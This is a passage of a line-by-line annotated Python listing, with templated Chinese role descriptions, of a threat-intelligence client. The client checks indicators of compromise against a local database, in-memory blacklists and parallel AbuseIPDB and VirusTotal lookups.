| 112 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 113 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        abuseipdb_key: str = "",` |
| 114 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        virustotal_key: str = "",` |
| 115 | 代码语句：参与当前文件的业务流程或数据处理。 | `        *,` |
| 116 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        external_http_timeout: Optional[float] = None,` |
| 117 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        external_wait_sec: Optional[float] = None,` |
| 118 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        db_session_factory: Optional[Callable[[], Any]] = None,` |
| 119 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        mock_external: Optional[bool] = None,` |
| 120 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> None:` |
| 121 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.abuseipdb_key = abuseipdb_key` |
| 122 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.virustotal_key = virustotal_key` |
| 123 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.external_http_timeout = float(` |
| 124 | 代码语句：参与当前文件的业务流程或数据处理。 | `            external_http_timeout` |
| 125 | 条件判断：满足条件时进入对应分支。 | `            if external_http_timeout is not None` |
| 126 | 兜底分支：处理前面条件都不满足的情况。 | `            else os.environ.get("THREAT_INTEL_HTTP_TIMEOUT", "5")` |
| 127 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 128 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.external_wait_sec = float(` |
| 129 | 代码语句：参与当前文件的业务流程或数据处理。 | `            external_wait_sec` |
| 130 | 条件判断：满足条件时进入对应分支。 | `            if external_wait_sec is not None` |
| 131 | 兜底分支：处理前面条件都不满足的情况。 | `            else os.environ.get("THREAT_INTEL_EXTERNAL_WAIT_SEC", "0.45")` |
| 132 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 133 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._mock_external_override = mock_external` |
| 134 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._db_session_factory = db_session_factory` |
| 135 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._ti_flask_app: Any = None` |
| 136 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 137 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._ip_blacklist: Set[str] = set()` |
| 138 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._domain_blacklist: Set[str] = set()` |
| 139 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._url_blacklist: Set[str] = set()` |
| 140 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._hash_blacklist: Set[str] = set()` |
| 141 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._cve_blacklist: Set[str] = set()` |
| 142 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 143 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._last_update: Optional[datetime] = None` |
| 144 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._cache_ttl: timedelta = timedelta(hours=1)` |
| 145 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 146 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._lock = threading.Lock()` |
| 147 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._request_interval: float = 1.0` |
| 148 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._last_request_time: Optional[datetime] = None` |
| 149 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 150 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._providers: Dict[str, IOCProvider] = build_default_provider_registry(` |
| 151 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            abuseipdb_key=abuseipdb_key,` |
| 152 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            virustotal_key=virustotal_key,` |
| 153 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 154 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._executor = ThreadPoolExecutor(max_workers=4, thread_name_prefix="ti-ext")` |
| 155 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 156 | 函数定义：声明 `set_db_session_factory` 的输入、处理逻辑和返回结果。 | `    def set_db_session_factory(self, factory: Optional[Callable[[], Any]]) -> None:` |
| 157 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._db_session_factory = factory` |
| 158 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 159 | 函数定义：声明 `bind_flask_app` 的输入、处理逻辑和返回结果。 | `    def bind_flask_app(self, app: Any) -> None:` |
| 160 | 文档字符串：说明当前模块、类或函数的职责。 | `        """绑定 Flask 应用以便在 app_context 下访问 \`\`db.session\`\`。"""` |
| 161 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._ti_flask_app = app` |
| 162 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 163 | 装饰器：为下面的函数或类附加框架行为。 | `    @contextmanager` |
| 164 | 函数定义：声明 `_db_session_scope` 的输入、处理逻辑和返回结果。 | `    def _db_session_scope(self):` |
| 165 | 条件判断：满足条件时进入对应分支。 | `        if self._ti_flask_app is not None:` |
| 166 | 上下文管理：自动管理资源打开与释放。 | `            with self._ti_flask_app.app_context():` |
| 167 | 导入对象：从指定模块引入类、函数或常量。 | `                from web.database import db` |
| 168 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 169 | 代码语句：参与当前文件的业务流程或数据处理。 | `                yield db.session` |
| 170 | 返回结果：把处理后的值交回调用方。 | `            return` |
| 171 | 条件判断：满足条件时进入对应分支。 | `        if self._db_session_factory:` |
| 172 | 函数调用：执行已有函数/方法完成当前步骤。 | `            yield self._db_session_factory()` |
| 173 | 返回结果：把处理后的值交回调用方。 | `            return` |
| 174 | 代码语句：参与当前文件的业务流程或数据处理。 | `        yield None` |
| 175 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 176 | 函数定义：声明 `_use_mock_external` 的输入、处理逻辑和返回结果。 | `    def _use_mock_external(self) -> bool:` |
| 177 | 条件判断：满足条件时进入对应分支。 | `        if self._mock_external_override is not None:` |
| 178 | 返回结果：把处理后的值交回调用方。 | `            return bool(self._mock_external_override)` |
| 179 | 返回结果：把处理后的值交回调用方。 | `        return os.environ.get("THREAT_INTEL_MOCK", "").lower() == "true"` |
| 180 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 181 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 182 | 装饰器：为下面的函数或类附加框架行为。 | `    @staticmethod` |
| 183 | 函数定义：声明 `_validate_ip` 的输入、处理逻辑和返回结果。 | `    def _validate_ip(ip: str) -> bool:` |
| 184 | 条件判断：满足条件时进入对应分支。 | `        if not isinstance(ip, str) or not ip:` |
| 185 | 返回结果：把处理后的值交回调用方。 | `            return False` |
| 186 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        parts = ip.split(".")` |
| 187 | 条件判断：满足条件时进入对应分支。 | `        if len(parts) != 4:` |
| 188 | 返回结果：把处理后的值交回调用方。 | `            return False` |
| 189 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 190 | 返回结果：把处理后的值交回调用方。 | `            return all(0 <= int(p) <= 255 and p == str(int(p)) for p in parts)` |
| 191 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except ValueError:` |
| 192 | 返回结果：把处理后的值交回调用方。 | `            return False` |
| 193 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 194 | 函数定义：声明 `_local_db_lookup` 的输入、处理逻辑和返回结果。 | `    def _local_db_lookup(self, ioc_type: str, value: str) -> Optional[Dict[str, Any]]:` |
| 195 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 196 | 导入对象：从指定模块引入类、函数或常量。 | `            from src.collectors.ioc_repository import IOCRepository` |
| 197 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 198 | 上下文管理：自动管理资源打开与释放。 | `            with self._db_session_scope() as session:` |
| 199 | 条件判断：满足条件时进入对应分支。 | `                if session is None:` |
| 200 | 返回结果：把处理后的值交回调用方。 | `                    return None` |
| 201 | 返回结果：把处理后的值交回调用方。 | `                return IOCRepository(session).find_active_dict(ioc_type, value)` |
| 202 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception as exc:  # noqa: BLE001` |
| 203 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.debug("[ThreatIntel] DB 查询失败（降级）: %s", exc)` |
| 204 | 返回结果：把处理后的值交回调用方。 | `            return None` |
| 205 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 206 | 函数定义：声明 `_memory_hit` 的输入、处理逻辑和返回结果。 | `    def _memory_hit(self, ioc_type: str, value: str) -> bool:` |
| 207 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        t = ioc_type.lower()` |
| 208 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        v = value.strip()` |
| 209 | 上下文管理：自动管理资源打开与释放。 | `        with self._lock:` |
| 210 | 条件判断：满足条件时进入对应分支。 | `            if t == "ip":` |
| 211 | 返回结果：把处理后的值交回调用方。 | `                return v in self._ip_blacklist` |
| 212 | 条件判断：满足条件时进入对应分支。 | `            if t == "domain":` |
| 213 | 返回结果：把处理后的值交回调用方。 | `                return v.lower() in self._domain_blacklist` |
| 214 | 条件判断：满足条件时进入对应分支。 | `            if t == "url":` |
| 215 | 返回结果：把处理后的值交回调用方。 | `                return v in self._url_blacklist` |
| 216 | 条件判断：满足条件时进入对应分支。 | `            if t == "file_hash":` |
| 217 | 返回结果：把处理后的值交回调用方。 | `                return v.lower() in self._hash_blacklist` |
| 218 | 条件判断：满足条件时进入对应分支。 | `            if t == "cve":` |
| 219 | 返回结果：把处理后的值交回调用方。 | `                return v.upper() in self._cve_blacklist` |
| 220 | 返回结果：把处理后的值交回调用方。 | `        return False` |
| 221 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 222 | 函数定义：声明 `_add_memory` 的输入、处理逻辑和返回结果。 | `    def _add_memory(self, ioc_type: str, value: str) -> None:` |
| 223 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        t = ioc_type.lower()` |
| 224 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        v = value.strip()` |
| 225 | 上下文管理：自动管理资源打开与释放。 | `        with self._lock:` |
| 226 | 条件判断：满足条件时进入对应分支。 | `            if t == "ip" and self._validate_ip(v):` |
| 227 | 函数调用：执行已有函数/方法完成当前步骤。 | `                self._ip_blacklist.add(v)` |
| 228 | 条件分支：前面条件不满足时继续判断。 | `            elif t == "domain":` |
| 229 | 函数调用：执行已有函数/方法完成当前步骤。 | `                self._domain_blacklist.add(v.lower())` |
| 230 | 条件分支：前面条件不满足时继续判断。 | `            elif t == "url":` |
| 231 | 函数调用：执行已有函数/方法完成当前步骤。 | `                self._url_blacklist.add(v)` |
| 232 | 条件分支：前面条件不满足时继续判断。 | `            elif t == "file_hash":` |
| 233 | 函数调用：执行已有函数/方法完成当前步骤。 | `                self._hash_blacklist.add(v.lower())` |
| 234 | 条件分支：前面条件不满足时继续判断。 | `            elif t == "cve":` |
| 235 | 函数调用：执行已有函数/方法完成当前步骤。 | `                self._cve_blacklist.add(v.upper())` |
| 236 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 237 | 函数定义：声明 `refresh_local_from_db` 的输入、处理逻辑和返回结果。 | `    def refresh_local_from_db(self, session: Optional[Any] = None) -> int:` |
| 238 | 文档字符串：说明当前模块、类或函数的职责。 | `        """从数据库加载未过期 IOC 到内存；传入 session 或已配置 factory。"""` |
| 239 | 导入对象：从指定模块引入类、函数或常量。 | `        from src.collectors.ioc_repository import IOCRepository` |
| 240 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 241 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        sess = session` |
| 242 | 条件判断：满足条件时进入对应分支。 | `        if sess is None:` |
| 243 | 上下文管理：自动管理资源打开与释放。 | `            with self._db_session_scope() as s:` |
| 244 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                sess = s` |
| 245 | 条件判断：满足条件时进入对应分支。 | `        if sess is None:` |
| 246 | 返回结果：把处理后的值交回调用方。 | `            return 0` |
| 247 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        rows = IOCRepository(sess).list_active_dicts()` |
| 248 | 上下文管理：自动管理资源打开与释放。 | `        with self._lock:` |
| 249 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._ip_blacklist.clear()` |
| 250 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._domain_blacklist.clear()` |
| 251 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._url_blacklist.clear()` |
| 252 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._hash_blacklist.clear()` |
| 253 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._cve_blacklist.clear()` |
| 254 | 循环：逐个处理集合或迭代器中的元素。 | `            for r in rows:` |
| 255 | 函数调用：执行已有函数/方法完成当前步骤。 | `                self._add_memory(str(r["ioc_type"]), str(r["value"]))` |
| 256 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._last_update = _utc_now()` |
| 257 | 返回结果：把处理后的值交回调用方。 | `        return len(rows)` |
| 258 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 259 | 装饰器：为下面的函数或类附加框架行为。 | `    @staticmethod` |
| 260 | 函数定义：声明 `_fuse_provider_results` 的输入、处理逻辑和返回结果。 | `    def _fuse_provider_results(results: List[Dict[str, Any]]) -> Dict[str, Any]:` |
| 261 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        malicious = False` |
| 262 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        max_score: Optional[int] = None` |
| 263 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        sources: List[str] = []` |
| 264 | 循环：逐个处理集合或迭代器中的元素。 | `        for r in results:` |
| 265 | 条件判断：满足条件时进入对应分支。 | `            if not r.get("ok"):` |
| 266 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 267 | 条件判断：满足条件时进入对应分支。 | `            if r.get("is_malicious") or r.get("hit"):` |
| 268 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                malicious = True` |
| 269 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                prov = str(r.get("provider", "unknown"))` |
| 270 | 条件判断：满足条件时进入对应分支。 | `                if prov not in sources:` |
| 271 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    sources.append(prov)` |
| 272 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            sc = r.get("score")` |
| 273 | 条件判断：满足条件时进入对应分支。 | `            if isinstance(sc, (int, float)):` |
| 274 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                si = int(sc)` |
| 275 | 条件判断：满足条件时进入对应分支。 | `                if max_score is None or si > max_score:` |
| 276 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    max_score = si` |
| 277 | 返回结果：把处理后的值交回调用方。 | `        return {` |
| 278 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "is_malicious": malicious,` |
| 279 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "score": max_score,` |
| 280 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "providers": sources,` |
| 281 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 282 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 283 | 函数定义：声明 `_query_external_parallel` 的输入、处理逻辑和返回结果。 | `    def _query_external_parallel(` |
| 284 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self, ioc_type: str, value: str, provider_names: List[str]` |
| 285 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> Dict[str, Any]:` |
| 286 | 文档字符串：说明当前模块、类或函数的职责。 | `        """线程池并行查询；在 \`\`external_wait_sec\`\` 内尽量收齐结果，超时则降级。"""` |
| 287 | 条件判断：满足条件时进入对应分支。 | `        if self._use_mock_external():` |
| 288 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            out: List[Dict[str, Any]] = []` |
| 289 | 条件判断：满足条件时进入对应分支。 | `            if "abuseipdb" in provider_names and ioc_type == "ip":` |
| 290 | 条件判断：满足条件时进入对应分支。 | `                if self.abuseipdb_key:` |
| 291 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    out.append(` |
| 292 | 函数调用：执行已有函数/方法完成当前步骤。 | `                        self._providers["abuseipdb"].query(` |
| 293 | 代码语句：参与当前文件的业务流程或数据处理。 | `                            ioc_type, value, timeout=self.external_http_timeout` |
| 294 | 函数调用：执行已有函数/方法完成当前步骤。 | `                        )` |
| 295 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    )` |
| 296 | 兜底分支：处理前面条件都不满足的情况。 | `                else:` |
| 297 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    out.append(_mock_abuseipdb(value))` |
| 298 | 条件判断：满足条件时进入对应分支。 | `            if "virustotal" in provider_names:` |
| 299 | 条件判断：满足条件时进入对应分支。 | `                if self.virustotal_key:` |
| 300 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    out.append(` |
| 301 | 函数调用：执行已有函数/方法完成当前步骤。 | `                        self._providers["virustotal"].query(` |
| 302 | 代码语句：参与当前文件的业务流程或数据处理。 | `                            ioc_type, value, timeout=self.external_http_timeout` |
| 303 | 函数调用：执行已有函数/方法完成当前步骤。 | `                        )` |
| 304 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    )` |
| 305 | 兜底分支：处理前面条件都不满足的情况。 | `                else:` |
| 306 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    out.append(_mock_virustotal(ioc_type, value))` |
| 307 | 循环：逐个处理集合或迭代器中的元素。 | `            for name in provider_names:` |
| 308 | 条件判断：满足条件时进入对应分支。 | `                if name in ("spamhaus", "phishtank", "openphish", "nvd", "cnvd"):` |
| 309 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    out.append(self._providers[name].query(ioc_type, value, timeout=0.1))` |
| 310 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            fused = self._fuse_provider_results(out)` |
| 311 | 返回结果：把处理后的值交回调用方。 | `            return {` |
| 312 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "is_malicious": fused["is_malicious"],` |
| 313 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "source": ",".join(fused["providers"]) if fused["providers"] else "none",` |
| 314 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "score": fused["score"],` |
| 315 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "degraded": False,` |
| 316 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "raw": out,` |
| 317 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 318 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 319 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        futures: List[Any] = []` |
| 320 | 循环：逐个处理集合或迭代器中的元素。 | `        for name in provider_names:` |
| 321 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            prov = self._providers.get(name)` |
| 322 | 条件判断：满足条件时进入对应分支。 | `            if not prov:` |
| 323 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 324 | 条件判断：满足条件时进入对应分支。 | `            if name == "abuseipdb" and ioc_type != "ip":` |
| 325 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 326 | 函数调用：执行已有函数/方法完成当前步骤。 | `            futures.append(` |
| 327 | 函数调用：执行已有函数/方法完成当前步骤。 | `                self._executor.submit(` |
| 328 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    prov.query, ioc_type, value, timeout=self.external_http_timeout` |
| 329 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 330 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 331 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 332 | 条件判断：满足条件时进入对应分支。 | `        if not futures:` |
| 333 | 返回结果：把处理后的值交回调用方。 | `            return {` |
| 334 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "is_malicious": False,` |
| 335 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "source": "none",` |
| 336 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "score": None,` |
| 337 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "degraded": False,` |
| 338 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 339 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 340 | 函数调用：执行已有函数/方法完成当前步骤。 | `        done, not_done = wait(futures, timeout=self.external_wait_sec)` |
| 341 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        collected: List[Dict[str, Any]] = []` |
| 342 | 循环：逐个处理集合或迭代器中的元素。 | `        for fut in done:` |
| 343 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 344 | 函数调用：执行已有函数/方法完成当前步骤。 | `                collected.append(fut.result())` |
| 345 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception as exc:  # noqa: BLE001` |
| 346 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.debug("[ThreatIntel] provider future 异常: %s", exc)` |
| 347 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        degraded = bool(not_done)` |
| 348 | 条件判断：满足条件时进入对应分支。 | `        if degraded:` |
| 349 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.warning(` |
| 350 | 代码语句：参与当前文件的业务流程或数据处理。 | `                "[ThreatIntel] 外部情报等待超时（%.2fs），已降级；未完成查询仍在后台执行",` |
| 351 | 代码语句：参与当前文件的业务流程或数据处理。 | `                self.external_wait_sec,` |
| 352 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 353 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 354 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        fused = self._fuse_provider_results(collected)` |
| 355 | 条件判断：满足条件时进入对应分支。 | `        if fused["is_malicious"]:` |
| 356 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._add_memory(ioc_type, value)` |
| 357 | 返回结果：把处理后的值交回调用方。 | `            return {` |
| 358 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "is_malicious": True,` |
| 359 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "source": ",".join(fused["providers"]) if fused["providers"] else "external",` |
| 360 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "score": fused["score"],` |
| 361 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "degraded": degraded,` |
| 362 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "raw": collected,` |
| 363 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 364 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 365 | 条件判断：满足条件时进入对应分支。 | `        if degraded:` |
| 366 | 返回结果：把处理后的值交回调用方。 | `            return {` |
| 367 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "is_malicious": False,` |
| 368 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "source": "none",` |
| 369 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "score": fused.get("score"),` |
| 370 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "degraded": True,` |
| 371 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "reason": "external_timeout",` |
| 372 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "raw": collected,` |
| 373 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 374 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 375 | 返回结果：把处理后的值交回调用方。 | `        return {` |
| 376 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "is_malicious": False,` |
| 377 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "source": "none",` |
| 378 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "score": fused.get("score"),` |
| 379 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "degraded": False,` |
| 380 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "raw": collected,` |
| 381 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 382 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 383 | 函数定义：声明 `_check_ioc_core` 的输入、处理逻辑和返回结果。 | `    def _check_ioc_core(self, ioc_type: str, value: str) -> Dict[str, Any]:` |
| 384 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        t = ioc_type.lower()` |
| 385 | 条件判断：满足条件时进入对应分支。 | `        if t not in _IOC_TYPES:` |
| 386 | 返回结果：把处理后的值交回调用方。 | `            return {` |
| 387 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "is_malicious": False,` |
| 388 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "source": "none",` |
| 389 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "reason": "invalid_ioc_type",` |
| 390 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 391 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 392 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        row = self._local_db_lookup(t, value)` |
| 393 | 条件判断：满足条件时进入对应分支。 | `        if row:` |
| 394 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            sc = row.get("score")` |
| 395 | 返回结果：把处理后的值交回调用方。 | `            return {` |
| 396 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "is_malicious": True,` |
| 397 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "source": "local_db",` |
| 398 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "score": int(sc) if isinstance(sc, (int, float)) else sc,` |
| 399 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "sources": row.get("sources") or [],` |
| 400 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "ioc_value": row.get("value"),` |
| 401 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "metadata": row.get("metadata"),` |
| 402 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "reason": row.get("reason") or "local_ioc_hit",` |
| 403 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 404 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 405 | 条件判断：满足条件时进入对应分支。 | `        if self._memory_hit(t, value):` |
| 406 | 返回结果：把处理后的值交回调用方。 | `            return {` |
| 407 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "is_malicious": True,` |
| 408 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "source": "local",` |
| 409 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "ioc_value": value.strip() if t != "domain" else value.strip().lower(),` |
| 410 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "reason": "memory_blacklist",` |
| 411 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 412 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 413 | 条件判断：满足条件时进入对应分支。 | `        if self._use_mock_external():` |
| 414 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            ext_names = ["abuseipdb", "virustotal"] if t == "ip" else ["virustotal"]` |
| 415 | 兜底分支：处理前面条件都不满足的情况。 | `        else:` |
| 416 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            ext_names = []` |
| 417 | 条件判断：满足条件时进入对应分支。 | `            if t == "ip" and self.abuseipdb_key:` |
| 418 | 函数调用：执行已有函数/方法完成当前步骤。 | `                ext_names.append("abuseipdb")` |
| 419 | 条件判断：满足条件时进入对应分支。 | `            if self.virustotal_key:` |
| 420 | 函数调用：执行已有函数/方法完成当前步骤。 | `                ext_names.append("virustotal")` |
| 421 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 422 | 条件判断：满足条件时进入对应分支。 | `        if not ext_names:` |
| 423 | 返回结果：把处理后的值交回调用方。 | `            return {"is_malicious": False, "source": "none"}` |
| 424 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 425 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ext = self._query_external_parallel(t, value, ext_names)` |
